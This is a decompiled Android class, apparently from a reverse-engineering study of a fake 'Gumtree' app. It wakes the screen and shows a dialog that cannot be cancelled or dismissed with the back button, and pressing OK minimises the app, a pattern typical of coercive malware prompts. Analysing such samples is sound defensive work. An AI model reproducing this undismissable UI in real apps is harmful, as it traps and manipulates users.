package com.gumsis.ds;

import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.os.Bundle;
import com.gumsis.base.BaseActivity;
import com.gumsis.base.dialog.AlertDialog;
import com.gumsis.base.dialog.AlertDialog.Builder;
import com.gumsis.checktls.IntTls;
import com.gumsis.checktls.ScrTls;

public class AccOnDialog
  extends BaseActivity
{
  private AlertDialog mDialog;
  
  private void showDialog()
  {
    try
    {
      String str = getString(2131361813);
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setTitle(getString(2131361810));
      localBuilder.setMessage(str);
      localBuilder.setPositiveButton("OK", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          IntTls.minimizeApp(AccOnDialog.this);
          AccOnDialog.this.destroyDialog(AccOnDialog.this.mDialog);
        }
      });
      this.mDialog = localBuilder.create();
      this.mDialog.setCancelable(false);
      this.mDialog.setCanceledOnTouchOutside(false);
      this.mDialog.show();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void onBackPressed() {}
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    ScrTls.scrOn(this);
    showDialog();
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    ScrTls.scrOff(this);
  }
  
  protected void onPause()
  {
    super.onPause();
    destroyDialog(this.mDialog);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/ds/AccOnDialog.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */